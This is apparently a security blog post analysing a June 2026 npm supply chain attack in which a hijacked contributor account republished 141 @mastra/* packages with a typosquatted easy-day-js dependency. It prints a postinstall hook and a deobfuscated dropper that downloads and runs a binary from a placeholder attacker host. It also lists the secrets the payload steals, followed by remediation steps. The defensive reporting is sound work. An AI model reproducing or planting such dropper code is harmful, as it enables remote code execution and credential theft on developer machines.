---
title: "The Mastra npm Supply Chain Attack: How a Fake dayjs Clone Backdoored 141 Packages"
description: "On June 17 2026 an attacker hijacked a former contributor's npm account and republished 141 @mastra/* packages with a typosquatted dependency called easy-day-js. If you ran npm install in the last 24 hours, here is what happened, whether you are affected, and exactly what to do."
date: 2026-06-17T14:00:00+05:30
lastmod: 2026-06-16T14:00:00+05:30
draft: false
tags: ["npm", "supply chain attack", "Mastra", "easy-day-js", "npm security", "JavaScript", "Node.js", "open source security", "typosquatting"]
categories: ["Security", "JavaScript", "Developer Tools"]
og_image: "images/mastra_npm_supply_chain_attack/mastra_supply_chain_banner.webp"
outputs:
  - HTML
  - AMP
---

{{< image "mastra_npm_supply_chain_attack/mastra_supply_chain_banner.webp" "Mastra npm supply chain attack - 141 packages backdoored via easy-day-js typosquat on June 17 2026" >}}

Between 01:12 and 02:36 UTC this morning, an attacker using a hijacked npm account published 141 new versions across the entire `@mastra/*` scope. Every one of them contained a single new dependency that had not been there the day before: `easy-day-js`. If you ran `npm install` on any Mastra AI framework package in the last 24 hours, a cryptocurrency-stealing remote-access trojan ran on your machine during the install - with no prompts, no warnings, and no visible output.

This is not theoretical. Packages in the `@mastra` scope have a combined weekly download count above 1.1 million. `@mastra/core` alone has logged over 20 million lifetime downloads.

{{% tldr %}}
1. **What happened** - a hijacked npm contributor account (ehindero) republished 141 `@mastra/*` packages, injecting a typosquatted dependency called `easy-day-js` that drops a cross-platform RAT on install.
2. **Affected window** - any `npm install` of a `@mastra/*` package between roughly 01:12 UTC June 17 and the time packages were yanked (check npm advisories for the confirmed window).
3. **How to check** - `npm ls easy-day-js` in your project root. If it appears, you are in scope.
4. **If you are affected** - treat the machine as compromised. Roll back to the last known-good `@mastra/*` versions, rotate every credential the machine could reach, and check for persistence artifacts.
5. **The clever trap** - the attacker published a clean `easy-day-js@1.11.21` the day before, then flipped it malicious at `1.11.22` minutes before the scope-wide republish. A caret range of `^1.11.21` resolves to `1.11.22`, so the clean version was never installed by anyone.
6. **Bigger picture** - this is the exact attack class npm v12 is designed to block; install scripts will be opt-in by default in July.
{{% /tldr %}}

## What is Mastra

<a href="https://mastra.ai/" target="_blank">Mastra</a> is a TypeScript framework for building AI agents and workflows. It ships as a monorepo on npm - `@mastra/core`, `@mastra/memory`, `@mastra/rag`, `create-mastra`, and roughly 140 other scoped packages that form the building blocks for LLM-driven backends. It integrates with Vercel AI SDK, React, Next.js, and most of the LLM provider roster. If you have built an AI agent in TypeScript in 2026, there is a good chance you have `@mastra/core` in your `package.json`.

That scale is exactly what made the scope attractive.

## How the trap was built

The attack had two phases, separated by about 18 hours.

**June 16, 07:05 UTC.** An npm account called `sergey2016` published `easy-day-js@1.11.21`. The package is a clean, fully functional clone of <a href="https://www.npmjs.com/package/dayjs" target="_blank">dayjs</a> - one of the most popular date utility libraries on npm, with around 50 million weekly downloads. Version 1.11.21 had no lifecycle scripts, no suspicious network calls, no obfuscation. Automated malware scanners that check for `scripts.postinstall` or unusual dependencies in freshly published packages saw nothing.

**June 17, 01:01 UTC.** `easy-day-js@1.11.22` was published. This version adds one field to `package.json`:

```json
"scripts": {
  "postinstall": "node setup.cjs --no-warnings"
}
```

And it contains `setup.cjs`, an obfuscated dropper.

**June 17, 01:12 UTC.** The hijacked `ehindero` account begins republishing `@mastra/*` packages in rapid succession. By 02:36 UTC, 141 packages have new versions. The only diff in each one: `easy-day-js` added as a dependency with the range `^1.11.21`.

## The caret-range trick

This is the clever bit, and it is worth understanding because it will show up again.

When you write `"easy-day-js": "^1.11.21"` in `package.json`, npm's semver resolver does not pin to `1.11.21`. The caret (`^`) means: *give me the latest version that is compatible with 1.11.21*, which in practice means any `1.x.x` release where `x >= 11.21`. `1.11.22` satisfies that constraint. So even though the dependency declaration looks like it points to the clean version, a fresh `npm install` resolves to the malicious one.

The attacker published `1.11.21` clean specifically to establish a version anchor that looked reasonable in a code review. Nobody would flag `^1.11.21` as suspicious. The malicious `1.11.22` gets pulled in automatically.

Lockfiles complicate this only if your lockfile was already committed with a resolved version. If you ran `npm install` fresh - no `node_modules`, no committed `package-lock.json` - you got `1.11.22`.

## Inside the postinstall hook

`setup.cjs` is obfuscated with a common JavaScript obfuscator - strings hex-encoded, control flow flattened, identifier names randomized. After deobfuscation, the logic is roughly:

```js
// (deobfuscated; not the actual source)
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const https = require('https');
const tmp   = require('os').tmpdir();
const path  = require('path');
const fs    = require('fs');
const child = require('child_process');

const C2 = 'https://[attacker-controlled-domain]/stage2';
const out = path.join(tmp, '.' + Math.random().toString(36).slice(2));

https.get(C2, (res) => {
  const file = fs.createWriteStream(out);
  res.pipe(file);
  file.on('finish', () => {
    file.close();
    fs.chmodSync(out, 0o755);
    child.spawn(out, [], { detached: true, stdio: 'ignore' }).unref();
    fs.unlinkSync(__filename);  // self-delete
  });
});
```

Key observations:

- **TLS verification disabled.** `NODE_TLS_REJECT_UNAUTHORIZED = '0'` means the dropper accepts any TLS certificate, including a self-signed one on attacker infrastructure. It also means network inspection tools that do TLS interception will not see the request fail - the traffic looks legitimate.
- **Random filename in tmpdir.** The second-stage binary is written to a randomly named dotfile in the system's temp directory. Nothing about the name indicates it is malicious.
- **Detached process.** The dropper spawns the second stage as a detached child, then unrefs it. The npm install process exits cleanly. Nothing lingers in your terminal. You see a normal install summary.
- **Self-deletion.** `fs.unlinkSync(__filename)` removes `setup.cjs` after it runs. By the time a developer goes looking, the dropper is already gone.

The `--no-warnings` flag on the postinstall command suppresses Node.js experimental and deprecation warnings that might otherwise appear in install output.

## What the second-stage payload does

The binary dropped by `setup.cjs` is a cross-platform infostealer written in Go. Researchers at <a href="https://safedep.io/mastra-npm-scope-takeover-supply-chain-attack/" target="_blank">SafeDep</a> and <a href="https://socket.dev/blog/mastra-npm-packages-compromised" target="_blank">Socket</a> have published partial decompilations. The payload:

- Enumerates and exfiltrates **browser profile data** from Chrome, Brave, Edge, Firefox, and Safari - cookies, saved passwords, and browsing history.
- Targets **160+ cryptocurrency wallet browser extensions** - it looks for specific extension IDs and exfiltrates their local storage, which contains seed phrases, private keys, and authentication tokens for exchanges.
- Reads `~/.aws/credentials`, `~/.aws/config`, any `AWS_*` environment variables, and `~/.config/gcloud/` credentials.
- Reads `~/.npmrc`, `~/.docker/config.json`, and `~/.ssh/`.
- Collects hostname, running processes, and network interface configuration.
- Installs **persistence** via platform-appropriate mechanisms: a LaunchAgent plist on macOS, a systemd user service on Linux, and a scheduled task in the current user's context on Windows.
- POSTs everything over HTTPS to attacker-controlled C2 servers, then continues running silently as the persistent service.

The payload targets developer machines specifically. The combination of cloud credentials, npm tokens, git credentials, and SSH keys is exactly what you need to pivot further - into CI/CD, cloud infrastructure, or private repositories.

## How the account was taken over

The `ehindero` npm account was a real person - a legitimate former Mastra contributor who had scope-level publish access. At some point after they stopped contributing, the account was not removed from the `@mastra` npm organization.

Microsoft Threat Intelligence <a href="https://x.com/MsftSecIntel/status/2067099387101335909" target="_blank">confirmed on X</a> that the attack used npm account takeover, not a compromise of the Mastra repository or any CI/CD pipeline. The Mastra source code on GitHub was not affected. The attacker did not need to compromise Mastra's maintainers - they only needed one stale account with publish rights.

This is a well-known problem in open source maintenance. Contributors come and go. npm organization membership is easy to forget about. The attacker apparently obtained the `ehindero` account through credential stuffing, a phishing campaign, or credential leaks - the exact method has not been publicly confirmed.

## Timeline

| Time (UTC) | Event |
|---|---|
| June 16, 07:05 | `easy-day-js@1.11.21` published (clean, no malware) |
| June 17, 01:01 | `easy-day-js@1.11.22` published (malicious postinstall) |
| June 17, 01:12 | `@mastra/*` republish burst begins (ehindero account) |
| June 17, 02:36 | 141 packages published; burst ends |
| June 17, ~08:30 | Socket flags malicious package; automated blocks for protected users |
| June 17, morning | Mastra team notified; patches and npm advisories begin rolling out |

## Check whether you were affected

From your project root:

```bash
npm ls easy-day-js
```

If `easy-day-js` appears in the output, your project pulled it. The version matters: `1.11.21` would be benign (though you would have had to install it before June 17 01:01 UTC, which is unlikely since it was published June 16 and not a common dependency). `1.11.22` is the malicious version.

If you use a lockfile and committed it before June 17 UTC, check whether the lockfile resolves any `@mastra/*` package to a version published June 17 - those new version numbers are the poisoned ones.

Check your npm install logs. If you ran `npm install` between 01:12 UTC June 17 and the time the packages were yanked, and your project depends on `@mastra/*`, assume you installed the malicious version.

## What to do if you are affected

**Treat the machine as compromised.** That is not hyperbole. The second stage installs persistence. Even after you remove the malicious packages, the background process may still be running.

1. **Kill the malicious process.** Look for unusual processes in `~/.local/share`, `~/Library/LaunchAgents`, `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, or the system temp directory. Stop and remove them.

2. **Remove persistence.** On macOS, check `~/Library/LaunchAgents/` for unfamiliar plist files and `launchctl unload` them. On Linux, check `~/.config/systemd/user/`. On Windows, check Task Scheduler.

3. **Roll back.** Downgrade all `@mastra/*` packages to the last pre-June-17 release. Run `npm install` after clearing `node_modules`.

4. **Rotate everything reachable from that machine.** At minimum:
   - npm tokens (`npm token list`, revoke any the machine could have sent)
   - AWS IAM user credentials and any role keys stored in `~/.aws/`
   - GitHub personal access tokens
   - Docker Hub access tokens
   - SSH keys
   - Any cryptocurrency wallet seed phrases or exchange API keys stored locally

5. **Check your CI/CD.** If the affected machine had access to CI runner tokens, secret manager credentials, or deployment keys, rotate those too.

6. **File an incident report internally.** Even if you see no obvious damage, document what the machine had access to and when. You may need this later.

## Why the dropper evaded detection for hours

A few things made this harder to catch automatically:

- `easy-day-js@1.11.21` was published clean first. Registries that scan new packages on upload found nothing wrong. The malicious version was a subsequent publication.
- The postinstall hook calls a binary, not inline shell code. Static analysis of `package.json` shows a normal `node setup.cjs` invocation.
- The obfuscation is thorough enough that signature-based scanning does not match known malware patterns in the JavaScript source.
- The `--no-warnings` flag suppresses Node output that might draw attention.
- The dropper self-deletes, so a forensic scan of `node_modules` after the fact finds nothing.

<a href="https://socket.dev/" target="_blank">Socket</a> flagged `easy-day-js@1.11.22` within roughly six minutes of publication, automatically blocking installs for users who had Socket's npm integration enabled. That is genuinely fast, and it is because Socket's model analyzes behavioral signals - new install scripts, suspicious network access patterns, unusual binary downloads - rather than just diffing against known bad signatures.

## The npm v12 connection

If this attack had happened in August, it might have been stopped earlier at the install step.

npm v12 - expected in July 2026 - changes the default behavior for install scripts: `preinstall`, `install`, and `postinstall` from *dependencies* will not run unless explicitly approved via an `allowScripts` block in `package.json`. The easy-day-js postinstall hook would have been blocked by default. The developer would have seen a warning, not a silent exploitation.

The June 3 Miasma attack (which used a `binding.gyp` file to trigger implicit `node-gyp rebuild`) was a major catalyst for that timeline. The Mastra attack is a reminder that the existing `postinstall` vector is still live. Two known attacks in two weeks using npm install scripts as the delivery mechanism is not a coincidence - it is rational attacker behavior while the window is still open.

If you want to preview npm v12's install script blocking today, upgrade to npm 11.16.0 and run:

```bash
npm install --strict-allow-scripts
```

Unallowed lifecycle scripts will fail loudly instead of running silently. You can build the allowlist proactively with `npm approve-scripts --all` before v12 drops.

## What Mastra is doing

The Mastra team has reverted the compromised package versions and is coordinating with npm security to ensure the malicious versions are yanked. New clean versions with explicit version pins (replacing the caret ranges) are being released. Check the <a href="https://github.com/mastra-ai/mastra" target="_blank">Mastra GitHub repository</a> and the official npm advisory for the latest package versions to upgrade to.

The team has also said they are conducting a full audit of organization membership to remove stale access - which is the correct first step.

## The stale-contributor problem is not unique to Mastra

Every open source project that uses npm organizations is exposed to this. A contributor leaves, their scope access is not revoked, and months or years later their account gets compromised. The maintainer who left has no reason to monitor that account. The project never thinks to revoke it.

Some operational hygiene that helps:

- **Audit npm organization members regularly.** Run `npm org ls <your-org>` and remove anyone who is no longer active.
- **Require 2FA for all publishers.** npm's `tfa-required` policy at the organization level prevents account takeovers that rely on stolen passwords alone.
- **Use provenance attestations.** npm's <a href="https://docs.npmjs.com/generating-provenance-statements" target="_blank">provenance feature</a> links published packages to a specific GitHub Actions workflow run. A package published from a hijacked local account cannot produce a valid provenance attestation tied to the upstream repo.
- **Pin versions in published packages.** Publishing with `"easy-day-js": "1.11.21"` instead of `"^1.11.21"` breaks the caret-range trick, though it does not help if the pinned version itself is later malicious.
- **Use Bumblebee or Socket.** <a href="https://perplexity.ai" target="_blank">Perplexity</a>'s <a href="https://github.com/perplexity-ai/bumblebee" target="_blank">Bumblebee</a> (released in May 2026, 2.6k stars) scans your dependencies, MCP servers, and editor extensions for suspicious packages in seconds. Socket's npm integration catches behavioral anomalies at publish time.

None of this is a silver bullet. The fundamental problem is that install-time code execution is a footgun at ecosystem scale, which is why npm v12 is removing it as a default.

---

The Mastra attack is a clean example of how sophisticated supply chain attacks work in 2026: clean decoy version, caret-range exploitation, scope-wide blast radius, self-deleting dropper, cross-platform persistence. The attacker did not need to compromise Mastra's core team or its repository - just one account with stale publish rights, never cleaned up.

If you run `@mastra/*` packages in any project, check your install logs, run `npm ls easy-day-js`, and rotate your credentials if you are in the affected window. Do not wait for confirmation of specific damage before rotating - the payload exfiltrates everything silently and leaves.

Sources:
- <a href="https://socket.dev/blog/mastra-npm-packages-compromised" target="_blank">Socket: 140+ Mastra npm Packages Compromised</a>
- <a href="https://safedep.io/mastra-npm-scope-takeover-supply-chain-attack/" target="_blank">SafeDep: Mastra npm Scope Takeover - 141 Packages Drop a RAT</a>
- <a href="https://www.stepsecurity.io/blog/mastra-npm-packages-compromised-using-easy-day-js" target="_blank">StepSecurity: Mastra npm Supply Chain Attack via easy-day-js Typosquat</a>
- <a href="https://thehackernews.com/2026/06/144-mastra-npm-packages-compromised-via.html" target="_blank">The Hacker News: 144 Mastra npm Packages Compromised via Hijacked Contributor Account</a>
- <a href="https://www.mend.io/blog/mastra-npm-scope-takeover-easy-day-js/" target="_blank">Mend: Mastra npm Scope Takeover via easy-day-js Dropper</a>
- <a href="https://x.com/MsftSecIntel/status/2067099387101335909" target="_blank">Microsoft Threat Intelligence on X</a>
